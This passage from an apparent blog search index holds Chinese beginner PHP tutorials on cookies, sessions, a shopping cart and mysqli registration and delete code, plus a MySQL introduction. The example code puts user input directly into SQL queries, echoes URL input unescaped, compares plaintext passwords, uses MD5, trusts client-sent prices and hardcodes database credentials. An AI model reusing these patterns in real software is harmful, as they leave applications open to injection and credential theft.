!= null ) ) {\n    $userName = $_POST['username'];\n    $password = $_POST['password'];\n    //从db获取用户信息\n    //PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码\n    $conn = mysqli_connect('localhost','root','root');\n\n    mysqli_select_db($conn,'test');\n\n    $sql = \"select * from user where `username` = '$userName' \";\n    $res = mysqli_query($conn,$sql);\n    $row = mysqli_fetch_assoc($res);\n    if ($row['password'] == $password) {\n        //密码验证通过，设置cookies，把用户名和密码保存在客户端\n        setcookie('username',$userName,time()+60*60*24*30);//设置时效一个月,一个月后这个cookie失效\n        setcookie('password',$password,time()+60*60*24*30);\n        //最后跳转到登录后的欢迎页面\n        header('Location: welcome.php' . \"?username=$userName\");\n    }\n}\n\n//再次访问的时候通过cookie来识别用户\nif ( ($_COOKIE['username'] != null)  &amp;&amp; ($_COOKIE['password'] != null) ) {\n    $userName = $_COOKIE['username'];\n    $password = $_COOKIE['password'];\n\n    //从db获取用户信息\n    //PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码\n    $conn = mysqli_connect('localhost','root','root','test');\n    $res = mysqli_query($conn,\"select * from user where `username` =  '$userName' \");\n    $row = mysqli_fetch_assoc($res);\n    if ($row['password'] == $password) {\n        //验证通过后跳转到登录后的欢迎页面\n        header('Location: welcome.php' . \"?username=$userName\");\n    }\n}\n\n?>\n&lt;html>\n&lt;head>\n\n&lt;/head>\n&lt;body>\n&lt;form action=\"\" method=\"POST\">\n    &lt;div>\n        用户名：&lt;input type=\"text\" name=\"username\" />\n        密  码：&lt;input type=\"text\" name=\"password\" />\n        &lt;input type=\"submit\" value=\"登录\">\n    &lt;/div>\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n&emsp;跳转到的welcome.php代码\n&lt;?php\n$user = $_GET['username'];\n?>\n&lt;html>\n&lt;head>\n\n&lt;/head>\n&lt;body>\n   welcome,&lt;?php echo $user;?>\n&lt;/body>\n&lt;/html>\n\n&emsp;\n\n\n这样，当我第一次访问cookie.php的时候，我需要输入用户名和密码，输入完毕后跳转到了welcome.php。然后我关闭浏览器，再次打开cookie.php，这次没有要求我输入用户信息，而是直接跳转到了welcome.php,因为之前我们存的cookie信息被浏览器自动发送到了服务端,服务端做完处理直接跳转到了welcome.php,服务器认识我们了！知道我是之前那个登陆过的用户，这样我们就通过cookie技术让无状态的HTTP协议保持了状态。照着这个做一遍，我相信你会用cookie了。\n只不过！！！只不过！！！只不过！！！重要的事要说3遍，我们一般是不会把用户名和密码放到cookie中的，因为这并不安全，容易泄露自己的信息，请不要把重要的信息放到cookie中。我们这个只是一个学习cookie的例子。\n\n\n&emsp;&emsp;\n四. PHP中使用session什么是session以及一些使用方法?可参考博文：\n[php中Session使用方法详解][PHP会话机制—session的基本使用][W3school PHP Sessions]\n\n&emsp;\n\n注意：session_start()函数之前不能有任何输出,session_start() 函数必须位于 &lt;html&gt; 标签之前：&lt;?php session_start(); ?&gt;&lt;\\html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 Session以数组的形式使用，如：$_SESSION[‘session名’]\n注册一个会话变量和读取Session\n在PHP中使用Session变量，除了要启动之外，还要经过注册的过程。注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION关联数组中的键名具有和PHP中普通变量相同的命名规则。\n\n&emsp;\n4.1 开启session使用函数：bool session_start()\n[PHP setcookie(void) 函数]\n\n首先我们要开启session，那么第一个要学习的函数就是bool session_start()了，这个函数没有参数。在php文件的开始使用\nsession_start();\n\n&emsp;\n4.2 (注册)添加session数据开启会话之后，那么在接下来的处理中，我们就可以使用$_SESSION变量来存取信息了。我们要知道的是$_SESSION变量是个数组。当我们要把信息存入session的时候应该这么写：\n $_SESSION['userName'] = 'wang';\n\n&emsp;\n4.3 读取session数据读取很简单，就像我们使用数组一样，如下：\n   $userName = $_SESSION['userName'];\n\n当然也可以 $_SESSION[‘userName’] 来用。和数组一样的使用。\n&emsp;\n4.4 销毁session数据我们可以使用很多种方式来销毁session数据。\na) unset函数我们通过使用类似\n\n\n   unset($_SESSION['XXX']);\n\n来销毁session中的 XXX 变量。\n\n请不要！请不要！请不要unset($_SESSION),会导致后续无法使用$_SESSION这个变量！！！\n\n&emsp;\nb) 空数组赋值给session变量\n\n   $\\_SESSION = array();\n\n\n之前我们说过$_SESSOIN变量是个数组，那么空数组赋值的话也是相当于将当前会话的$_SESSION变量中的值销毁。\n\n&emsp;\nc) session_destory() 函数这个函数会销毁当前会话中的全部数据，并结束当前会话。但是不会重置当前会话所关联的全局变量， 也不会重置会话 cookie。\n\n&emsp;\n4.5 session的扩展我们可以使用很多种方式来销毁session数据。默认session存储在哪里?&emsp;1.在php.ini配置文件中有这么一行 session.save_handler = files,files说明了php默认的是用文件读写的方式来保存session的。那么在哪个目录呢？继续看。session.save_path = “/tmp”,这一行前面有个 ; ，说明是被注释的，不过即便这样，php默认的session 也是保存在这里的，/tmp目录。\n&emsp;&emsp;\n五. SESSION应用实例5.1 登陆例子\n2个文件：\n\nlogin.php，用于登陆界面；\nwelcome.php，用于接收从login.php的跳转并设置session。\n\n\n首先建立数据库信息：新建一个名为 login 的数据库，再建一个 user 表，表的结构有2个字段:username  varchar(20)password  varchar(20)\n&emsp;login.php\n&lt;?php\nsession_start();\nif ( ( $_POST['username'] != null ) &amp;&amp; ( $_POST['password'] != null ) ) {\n   $userName = $_POST['username'];\n   $password = $_POST['password'];\n\n   //从db获取用户信息   数据库信息改成自己的\n   $conn = mysqli_connect('host','username','password','login');\n   $res = mysqli_query($conn,\"select * from user where `username` =  '$username' \");\n   $row = mysqli_fetch_assoc($res);\n   if ($row['password'] == $password) {\n       //密码验证通过，设置session，把用户名和密码保存在服务端\n       $_SESSION['username'] = $username;\n       $_SESSION['password'] = $password;\n\n       //最后跳转到登录后的欢迎页面 //注意：这里我们没有像cookie一样带参数过去\n       header('Location: welcome.php');\n   }\n}\n\n?>\n&lt;html>\n&lt;head>\n&lt;!-- 这里指明页面编码 -->\n&lt;meta charset=\"utf-8\">\n&lt;/head>\n&lt;body>\n   &lt;form action=\"\" method=\"POST\">\n       &lt;div>\n           用户名：&lt;input type=\"text\" name=\"username\" />\n           密  码：&lt;input type=\"text\" name=\"password\" />\n           &lt;input type=\"submit\" value=\"登录\">        \n       &lt;/div>\n   &lt;/form>\n&lt;/body>\n&lt;/html>\n\n&emsp;&emsp;welcome.php 这里我们用的是session中的信息,而不是像cookie一样在url中带参数过来\n&lt;?php\nsession_start();\n$username = $_SESSION['username'];\n?>\n&lt;html>\n&lt;head>\n\n&lt;/head>\n&lt;body>\n   welcome,&lt;?php echo $username;?>\n&lt;/body>\n&lt;/html>\n\n&emsp;\n5.2 购物车例子\n3个文件：\n\ngoodsList.php 这个是商品展示页，还有功能：如果是第一次购买某物品，则在购物车中加入该商品信息和计算总价，如果再次点击购买，则已购商品数量加1，总价重新计算，查看购物车链接可以到购物车页面。\nbuy.php 此页完成购买功能，然后再次跳转到商品列表。主要是做了在session中处理购买商品操作。\nshoppingCart.php 此页展示购物车中的商品、价格、总价等信息。\n\n\n&emsp;首先建立数据库信息：建立名为test的数据库，库中有个shop表，表结构有3个字段：id  int(10)name  varchar(20)price  varchar(20)\n&emsp;goodsList.php\n&lt;?php\n   $goods = array();\n   //从数据库获取商品信息存入$goods二维数组\n   $i = 0;\n   //这里请换上自己的数据库相关信息\n   $conn = mysqli_connect('host','username','password','test');\n   $res = mysqli_query($conn,'select * from shop');\n   //这里把商品信息放到$goods二维数组，每一维存的是单个\n   //商品的信息，比如商品名、价格。\n   while ($row = mysqli_fetch_assoc($res)) {\n       $goods[$i]['id'] = $row['id'];\n       $goods[$i]['name'] = $row['name'];\n       $goods[$i]['price'] = $row['price'];\n       $i++ ;\n   }\n\n?>\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n   &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\">\n&lt;/head>\n&lt;body>\n   &lt;?php\n   //取出商品信息显示在页面上，并添加购买功能\n       foreach ($goods as $value) {\n           echo ' 商品名 ' . $value['name'] . ' 价格 ' . $value['price'];\n           echo \"&lt;a href=buy.php?name=\" . $value['name'] . '&amp;price=' . $value['price'] .\">购买&lt;/a>\";\n           echo '&lt;br />';\n       }\n\n   ?>\n   &lt;a href=\"shoppingCart.php\">查看购物车&lt;/a>\n&lt;/body>\n&lt;/html>\n\n&emsp;buy.php\n&lt;html>\n&lt;head>\n   &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\">\n&lt;/head>\n&lt;body>\n&lt;?php\n   //开启session\n   session_start();\n\n   //获取传过来的商品名和价格\n   $name = $_GET['name'];\n   $price = $_GET['price'];\n\n   //把session中的商品信息和传过来的(刚买的)商品信息对比\n   $goods = $_SESSION['goods'];\n   if ($name == $goods[$name]['name']) {\n       //买过的话，则总价格增加，相应商品数量增加\n       $_SESSION['totalPrice'] += $price;\n       $goods[$name]['number'] += 1;\n   } else {\n       //第一次买的话，将相应的商品信息添加到session中\n       $goods[$name]['name'] = $name;\n       $goods[$name]['price'] = $price;\n       $goods[$name]['number'] += 1;\n       $_SESSION['totalPrice'] += $price;\n   }\n\n   $_SESSION['goods'] = $goods;\n   //购买处理完毕后跳转到商品列表\n   header('location: goodsList.php');\n?>\n&lt;/body>\n&lt;/html>\n\n&emsp;shoppingCart.php\n&lt;html>\n&lt;head>\n   &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\">\n&lt;/head>\n&lt;body>\n&lt;?php\nsession_start();\n//将session中的商品信息(即购物车中的商品)和总价显示到页面\n$goods = $_SESSION['goods'];\necho '您买了:&lt;br />';\nforeach ($goods as $value) {\n   echo $value['name'] . ' 价格 ' . $value['price'] . ' 数量 ' . $value['number'] . '&lt;br />';\n}\necho '总价：' . $_SESSION['totalPrice'] . '&lt;br />';\n\n?>\n&lt;a href=\"goodsList.php\">返回商品列表&lt;/a>\n&lt;/body>\n&lt;/html>\n\n&emsp;效果图如下：\n\n","thumbnail":"https://i.loli.net/2019/02/26/5c7506e133ec9.jpg","plink":"https://Directoree.github.io/post/PHP-SessionManagement/"},{"title":"PHP操作MySQL数据库","date":"2019-02-24T02:32:17.000Z","updated":"2019-02-27T17:13:19.685Z","content":"😁&ensp;&ensp;\nPHP操作MySQL数据库\n\n\n\n&emsp;&emsp;\n一. 数据库连接步骤将数据库连接整理成了最重要的8个步骤，我戏称它为：“数据库连接天龙八步”。😊  (。・∀・)ノ\n&emsp;\n第一步:  连接数据库服务器[PHP mysql_connect() 函数]\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_connect()\n\n\n函数原型\nmysql_connect(server,user,pwd,newlink,clientflag)\n\n\n功能\n连接到mysql数据库服务器\n\n\n返回值\n如果成功，则返回一个 MySQL 连接标识，失败则返回 FALSE。\n\n\n参数1\n主机\n\n\n参数2\n数据库服务器登陆名\n\n\n参数3\n密码\n\n\n参数4\n数据库的名称\n\n\n参数5\n数据库服务器端口不填默认3306\n\n\n\n\n对于参数4，数据库名称在此步已填并择，不需要执行第三步。\n\n&emsp;\n第二步:  判断错误[PHP mysqli_errno() 函数]\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_errno(connection)\n\n\n功能/返回值\n返回连接错误号，无错误返回0\n\n\n参数1\n传入mysqli_connect()返回的资源可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。\n\n\n\n&emsp;\n如果mysqli_errno()函数返回错误号，则用mysqli_error()显示文本错误信息。&emsp;[PHP mysql_error() 函数]\n\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_error(connection)\n\n\n功能/返回值\n返回连接错误字符串，如果没有出错则返回 ‘’（空字符串）\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n\n&emsp;\n第三步:  选择数据库[PHP mysqli_select_db() 函数]\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysql_selecti_db(connection,database)\n\n\n返回值\n如果成功，则该函数返回 true。如果失败，则返回 false。\n\n\n功能\n选择本连接中的数据库\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n参数2\n需要连接的数据库名\n\n\n\n\n若在第一步已填数据库，不需要更换成其他数据库，则不需要执行第三步。\n\n&emsp;\n第四步:  设置字符集[PHP mysqli_set_charset 函数]\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_set_charset(connection,charset)\n\n\n功能\n设置与mysql服力器连接，结果，校验字符集\n\n\n返回值\n无返回值\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n参数2\n字符集类型\n\n\n\n&emsp;\n第五步:  准备SQL语句其实就是一个SQL语句的字符串，用于对MySQL数据库的操作。这一步很重要！ \n\n&emsp;例如：\n&lt;?php\n$sql = \"insert into user(username,password) values('$username','$password')\";\n$con = mysql_connect(\"localhost\",\"peter\",\"abc123\");\nif (!$con)\n {\n die('Could not connect: ' . mysql_error());\n }\n\n// some code\n?>\n\n\n\n我们通常要把变量赋值在SQL语句中使用。可是变量或者SQL语句出错了，非常不好排查。\n我们根据实际工作经验增加了这一步。\n如果在执行此步的时候报错了，我们可以把SQL语句打印出来，粘贴到phpMyAdmin或者相关工具中。\n排错时，如果执行成功就说明不是SQL语句的问题。如果执行失败，请仔细检查SQL语句。\n\n\n&emsp;\n第六步:  发送SQL语句[PHP mysqli_query() 函数]\n\n\n\n\n类型\n说明\n\n\n\n\n功能\n发送SQL语句,执行一条 MySQL 查询。\n\n\n返回值\nmysqli_query() 仅对 SELECT，SHOW，EXPLAIN 或 DESCRIBE 语句返回一个资源标识符，如果查询执行不正确则返回 FALSE。\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n参数2\n传入发送的SQL语句。注意：查询字符串不应以分号结束。\n\n\n\n\n\nSQL语句准备完成，需要通过mysqli_query将SQL语句发送给MySQL服务器。\nMySQL服务器会执行发送过来的SQL语句进行执行。\n\n\n&emsp;\n第七步:  判断是否执行正常或者遍历数据[PHP mysqli_fetch_array() 函数]读取第6步中，发送的是select类别的语句，通常需要将结果以数组形式输出显示出来。就需要用到遍历显示数据的函数。\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_fetch_array(data,array_type)\n\n\n功能\n得到result结果集中的数据，返回数组进行遍历\n\n\n参数1\n可选。规定要使用的数据指针。该数据指针是 mysqli_query() 函数产生的结果。\n\n\n参数2\n可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组MYSQL_NUM - 数字数组MYSQL_BOTH - 默认。同时产生关联和数字数组\n\n\n\n&emsp;下面举例几个常用的将mysqli_query()查询得到的字符串处理成数组的函数…….\n\n\n\n\n\n函数\n功能\n\n\n\n\nmysqli_fetch_assoc(data)\n返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false\n\n\nmysqli_fetch_row(data)\n返回根据从结果集取得的行生成的索引数组，如果没有更多行，则返回 false\n\n\nmysqli_fetch_object(data)\n从结果集（记录集）中取得一行作为对象。若成功的话，本函数从 mysql_query() 获得一行，并返回一个对象。如果失败或没有更多的行，则返回 false。\n\n\nmysqli_num_rows(data)\n返回结果集中行的数目。此命令仅对 SELECT 语句有效。要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目，用 mysqli_affected_rows()。\n\n\nmysqli_fetch_field\n从结果集中取得列信息并作为对象返回。\n\n\n\n&emsp;\n第八步:  关闭数据库[PHP mysql_close() 函数]\n\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_close(link_identifier)\n\n\n功能\n关闭数据库连接\n\n\n返回值\n如果成功则返回 true，失败则返回 false。\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n\n&emsp;\n其他：显示服务器信息函数 \n\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_get_server_info\n\n\n功能\n返回服务器信息\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n\n\n\n\n类型\n说明\n\n\n\n\n函数\nmysqli_get_server_version\n\n\n功能\n返回服务器版本\n\n\n参数1\n传入mysqli_connect返回的资源\n\n\n\n\n注意：mysqli只学过程化的方法即可。在面向对象阶段实际工作中完全抛弃了mysqli的对象用法，而是使用的是PDO对象连接数据库的方式。\n\n&emsp;&emsp;\n二. 通过步骤做一个用户注册实例\n我们做一个最简单的注册页面。注册页面中有三个参数：\n\n用户名\n密码\n重复密码\n\n\n用户写好三个参数后，点击提交的时候向connect.php页面中传入POST记录。\n我们可以把POST记录处理后写入到MySQL数据库中，即完成了用户注。\n\n\n\n本例用到的两个文件：\n\nindex.php：表单页面；\nconnect.php：处理表单的页面。\n\n\n&emsp;\n一、 判断重复密码：\n\n\n1.由于有重复密码，如果用户两次输入的密码不一致也就是有没有进行下一步的任何意义。2.在网页中很多地方还是使用到了重复密码。因为，害怕的是用户产生手误。将密码填写出错。3.用户在输入密码的时候可能在左右两边多打两个空格。因此，我们会使用trim将密码和重复密码的两边去掉空格。\n\n&emsp;代码如下：\nif(trim($_POST['password']) != trim($_POST['repassword'])){\n    exit('两次密码不一致,请返回上一页');\n}\n\n&emsp;\n二、 准备好写入的数据：我们需要把用户的输入数据和隐藏的数据都写入到数据库。可见数据有：\n\n\n\n\n\n变量\n说明\n\n\n\n\n$_POST[‘username’]\n用户名\n\n\n$_POST[‘password’]\n密码\n\n\n\n\n\n我们需要把用户名去掉两边的空格，这样避免输入不必要的这些信息。\n在mysql这一章节我们讲过，用户的密码不要让包括公司内部人员可见。保证密码是不可逆向的。在初级阶段大家学习一下MD5即可。以后我们再教大家其他的加密方式。\n\n\n不可见数据有：\n\n\n\n\n\n变量\n说明\n\n\n\n\n$time\n用户的注册时间\n\n\n$_SERVER[‘REMOTE_ADDR’]\n用户的注册IP\n\n\n\n\n\ntime返回的unix时间戳\nREMOTE_ADDR返回的是IP地址，我们可以用ip2long将其转为整型存储。\n\n\n$username = trim($_POST['username']);\n$password = md5(trim($_POST['password']));\n$time = time();\n$ip = ip2long($_SERVER['REMOTE_ADDR']);\n\n&emsp;\n三、连接数据库、判断错误、选择库和字符集：\n\n\n\n\n我们使用mysqli_connect连接到数据库服务器。\n如果有错误，使用mysqli_errno得到错误号\n如何时存在错误mysqli_error打印出所有的错误，并且退出程序执行\n选择数据库并且设置字符集为utf8.\n\n\n//连接数据库\n$conn = mysqli_connect('localhost','root','liwenkaihaha');\n//如果有错误，存在错误号\nif(mysqli_errno($conn)){\n    echo mysqli_error($conn);\n    exit;\n}\n//选择数据库\nmysqli_select_db($conn,'user');\n//选择字符集\nmysqli_set_charset($conn,'utf8');\n\n&emsp;\n四、组合SQL语句：我们需要把得到的信息写入到数据库里面去，用户名、密码、创建时间、IP我们都得到了。将对应的变量插入到SQL语句中即可。组合出来的SQL语句如下：\n\n\n$sql = \"insert into user(username,password,createtime,createip) values('\" . $username . \"'\n,'\" . $password . \"','\" . $time . \"','\" . $ip . \"')\";\n\n&emsp;而我们的创建表的语句如下：\nCREATE TABLE IF NOT EXISTS user (\nid int(11) NOT NULL,\nusername varchar(30) NOT NULL,\npassword char(32) NOT NULL,\ncreatetime int(11) NOT NULL,\ncreateip int(11) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n&emsp;表的格式（字段对应说明）：\n\n\n\n\n\nid\nusername\npassword\ncreatetime\ncreateip\n\n\n\n\n用户编号\n用户名\n密码\n创建时间\n创建IP\n\n\n\n&emsp;\n五、发送语句，判断状态：\n\n\n\nmysqli_query我们在上面说过，需要传入两个参数：\n\n连接的资源，在这里对应的变量是$conn。\n发送的SQL语句。在上面已经准备好了$sql。\n\n\n\nSQL语句可以通过mysqli_query发送给MySQL服务器。发送成功$result则为true。否则为false。成功的话，我们就可以提示用户注册成功啦。有些情况下，可能还需要使用到mysqli_insert_id()。功能是获取上面通过insert插入数据的id并返回这个id。mysqli_insert_id应用场景：新加的一个行的数据。我们需要得到自动增长的ID值，将这个ID值插入到另外一个表里面去时。就需要用到这个函数。\n\n&emsp;\nmysqli_insert_id()使用举例：\n$result = mysqli_query($conn,$sql);\nif($result){\n    echo '注册成功';\n}else{\n    echo '注册失败';\n}\necho '当前用户插入的ID为'.mysqli_insert_id($conn);\n\n&emsp;\n六、关闭数据库连接：\n\n将资源变量传到到mysqli_close这个函数里面即可。\nmysqli_close($conn);\n\n&emsp;&emsp;&emsp;先建立test数据库、user数据表。数据表建立语句：\nCREATE TABLE IF NOT EXISTS user (id int(11) PRIMARY KEY AUTO_INCREMENT,username varchar(30) NOT NULL,password char(32) NOT NULL,createtime int(11) NOT NULL,createip varchar(20) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n\n&emsp;\n1. index.php表单页面：\n\n\n&lt;form action=\"connect.php\" method=\"post\">\n    用户名：&lt;input type=\"text\" name=\"username\">&lt;br />\n    密码：&lt;input type=\"password\" name=\"password\">&lt;br />\n    重复密码：&lt;input type=\"password\" name=\"repassword\">&lt;br />\n    &lt;input type=\"submit\" value=\"提交\">\n&lt;/form>\n\n&emsp;&emsp;\n2. connect.php页面完整代码：\n\n\n&lt;?php\n\nif (trim($_POST['password']) != trim($_POST['repassword'])) {\n   exit('两次密码不一致,请返回上一页');\n}\n\n$username = trim($_POST['username']);\n$password = md5(trim($_POST['password']));\n$time = time();\n$ip = $_SERVER['REMOTE_ADDR'];\n$conn = mysqli_connect('localhost', 'root', '');\n//echo $username.\"/\".$password.\"/\".$time.\"/\".$ip;\n//如果有错误，存在错误号\nif (mysqli_errno($conn)) {\n\n   echo mysqli_error($conn);\n\n   exit;\n}\n\nmysqli_select_db($conn, 'test');\nmysqli_set_charset($conn, 'utf8');\n\n$sql = \"insert into user(username,password,createtime,createip) values ('$username','$password','$time','$ip')\";\n\n$result = mysqli_query($conn, $sql);\n\nif ($result) {\n   echo '成功';\n} else {\n   echo '失败';\n   var_dump(\"错误为：\".mysqli_error($conn));\n   var_dump(\"返回值：\".$result);\n}\n\necho '当前用户插入的ID为' . mysqli_insert_id($conn);\nmysqli_close($conn);\n?>\n\n&emsp;&emsp;\n三. 通过步骤做一个列表显示实例[教程][视频]\n\n\n&emsp;&emsp;\n四. 通过步骤操作之把用户做个分页[教程][视频]\n\n\n&emsp;&emsp;\n五.  批量和指定删除用户上面已经学过了通过步骤做一个列表显示，在删除前，有单行删除数据和删除多行数据。\n&emsp;\n5.1 判断是单选还是多选删除\n\n单行是通过get传参的方式向delete.php文件中写上对应的ID。\n而多个删除是通过POST的方式向delete.php页面中传递对应的ID。\n如果这两个都不符合的话，那我们可以视为数据不合法。\n\n\nif (is_array($_POST['id'])) {\n    $id = join(',', $_POST['id']);\n} elseif (is_numeric($_GET['id'])) {\n    $id = (int) $_GET['id'];\n} else {\n    echo '数据不合法';\n    exit;\n}\n\n&emsp;\n5.2 组合SQL语句\n\nMySQL这一章讲解过删除时可以使用到in的子语句。\n同样在这里，我们就可以用in的子语句来达到效果。\njoin函数将多选删除传过来的id变为了3,4,5的格式，最终多选删除的SQL语句执行出来的效果就是：\n\n\ndelete from user where id in(3,4,5,6,8);\n\n&emsp;而单选删除的语句效果就是：\ndelete from user where id in(3)\n\n&emsp;这样我们就实现了单选和多选自适应效果：\n$sql = \"delete from user where id in($id)\";\n\n&emsp;最终配套而成的整体代码演示如下：\n&lt;?php\n\ninclude 'connection.php';\n\nif (is_array($_POST['id'])) {\n\n   $id = join(',', $_POST['id']);\n\n} elseif (is_numeric($_GET['id'])) {\n\n   $id = (int) $_GET['id'];\n\n} else {\n   echo '数据不合法';\n   exit;\n}\n\n$sql = \"delete from user where id in($id)\";\n\n$result = mysqli_query($conn, $sql);\n\nif ($result) {\n   echo '删除成功';\n} else {\n   echo '删除失败';\n}\n?>\n\n&emsp;&emsp;\n六. 通过步骤修改用户信息内容有点多，等哪天想起来了或者心情好了再写吧…..(✿◡‿◡)\n[教程][视频]\n\n\n&emsp;&emsp;\n七. 数据显示乱码终极解决办法解决乱码问题的核心思想，就是：一定要多个不同的文件系统中一定要统一编码。\n&emsp;总结成了9个要点来彻底解决连接后乱码的问题。\n\n\nhtml编码与MySQL编码一致\nPHP编码与MySQL编码一致\n若有header头发送字符集，请与数据库一样\n&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-8” /&gt;要和页面的文字编码一致\n数据库建库的字符集要统一\n表的字符集要统一\n列的字符集要统一(表设了,列就默认写表的)\n连接,校验的字符集要统一\n结果集的字符集要统一\n\n\n\n&emsp;&emsp;&emsp;\n一、 文件编码html和PHP文件的编码，示例中：拿notepad++来演示。将PHP和html都要设为这种字符集。一定要设置为utf-8无BOM格式。&emsp;二、 header头编码如果php中有header头，一定要是utf-8的\n\n\nheader('content-type:text/html;charset=utf-8');\n\n&emsp;\n三、网页头文件编码如果html文件编码是utf-8的也要设置为一置\n\n\n&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-8” />\n\n&emsp;\n四、创建数据库的编码\n\n\n&emsp;\n五、表和列创建的时候表为utf-8\n\n\n&emsp;\n六、连接，结果、校验字符集设置\n\n\n\n1.通过mysqli_set_charset(‘utf8’)来MySQL连接、结果和校验的字符集设置。2.注：数据库的字符集声明和文件中的略有不同。utf8为mysql数据库的，utf-8为文件中使用的。\n","thumbnail":"https://i.loli.net/2019/02/23/5c70e8131bb0c.jpg","plink":"https://Directoree.github.io/post/PHP-MySQL/"},{"title":"MySQL入门","date":"2019-02-23T06:23:42.000Z","updated":"2019-02-25T10:57:56.282Z","content":"内容好多啊◑﹏◐[那看视频吧…..] ٩(๑❛ᴗ❛๑)۶  (๑&gt;◡&lt;๑)\n\n&ensp;&ensp;\nMySQL入门\n\n\n&emsp;&emsp;\n一. MySQL介绍1.  MySQL数据库简称MySQL，是一款由瑞典MySQL AB公司开发并且应用广泛的数据管理系统，MySQL数据库因其体积小、速度快、总体拥有成本低 受到很多的热捧。现在,MySQL的所有者世界上最著名的数据库企业——Oracle所有。2.  MySQL的应用，在国内的企业包括：百度、阿里、腾讯、新浪、搜狐、网易等等企业，全部都在使用MySQL数据库。3.  MySQL是一种开放源代码的关系型数据库管理系统（RDBMS） ，MySQL数据库系统使用最常用的数据库管理语言–结构化查询语言（SQL）进行数据库管理。由于MySQL是开放源代码的，因此任何人都可以在GPL的许可下下载并根据个性化的需要对其进行修改。MySQL因为其速度、可靠性和适应性而备受关注。大多数人都认为在不需要事务化处理的情况下，MySQL是管理内容最好的选择。4.  PHP与很多数据库结合都很紧密。由于，PHP和MySQL都是开源免费的。所以PHP一直对于MySQL等数据库都有很好的支持。&emsp;&emsp;\n\n\n数据库的五个基本单位\n\n数据库服务器\n数据库\n数据表\n数据字段(列)\n数据行\n\n\n&emsp;\n1. 数据库服务器。是指用来运行数据库服务的一台电脑。在中小型企业通常为一台。在数据存储量计算量很大的时候可以存在多台。多台数据库服务器共同来存储或计算。由于数据安全非常重要，我们经常会对数据库服务器里面的数据进经备份。2. 数据库。一个数据库服务器里面有可以有多个数据库。主要用来分类使用。我们可以建立交通信息数据库、游戏数据库、酒店开房数据库… … 主要用来将各个不同用途的数据，按照业务进行大块的划分。3. 数据表。例如在游戏数据库中。根据这一款游戏又分为了不同的数据表。专门用来区分游戏不同的数据。例如：用户数据（用户、密码）；人物数据；所有装备和装备信息；用户的充值信息；药品、魔力药水信息… …等4. 数据字段，也叫数据列。就是我们日常所见表格里面的列。在表格中，我们会将一张用户表分成多个列。如下（表一）所示：用户编号、用户名、性别、年龄是字段。在真正的数据库中数据字段需要换成英文需要写成：id、username、sex、年龄。5. 数据行。真正的数据存在每一个表的行里面。字段（列）划分出来了一个表应该按照什么样的格式存数据。而行，是真正的数据。每一行需要遵循数据字段（列）的规范和要求进行存入数据。(表一)\n\n\n\n\n用户编号\n用户名\n性别\n年龄\n\n\n\n\n1\n李文凯\n男\n18\n\n\n2\n景田\n女\n16\n\n\n3\n宁泽涛\n男\n22\n\n\n\n&emsp;&emsp;\n二. 数据库语句操作类型1. 学习数据库安装后，最重要的就是学习SQL语句。2. SQL是操作数据库的核心，也是本章开始的一句话：MySQL对于PHP程序员来说就是将业务转化成表结构。做好业务中的增、删、改、查。3. 结构化查询语言(Structured Query Language)简称SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。&emsp;一. 数据库操作语句类型（DQL、DML、DDL、DCL）简介1. 数据查询语言DQL数据查询语言DQL基本结构是由SELECT子句，FROM子句，WHERE子句组成的查询块：\n\n\n\n\n语句\n功能\n\n\n\n\nSELECT\n&lt;字段名表&gt;\n\n\nFROM\n&lt;表或视图名&gt;\n\n\nWHERE\n&lt;查询条件&gt;\n\n\n\n&emsp;\n2 .数据操纵语言DML用于添加、删除、更新和查询数据库记录，并检查数据的完整性。数据操纵语言DML主要有三种形式：1) 插入：INSERT2) 更新：UPDATE3) 删除：DELETE&emsp;3. 数据定义语言DDL数据定义语言DDL用来创建数据库中的各种对象—–表、视图、索引、同义词、聚簇等。注意：DDL操作是隐性提交的！不能rollback常用的语句关键字包括1) CREATE：创建2) DROP：删除3) ALTER：修改4. 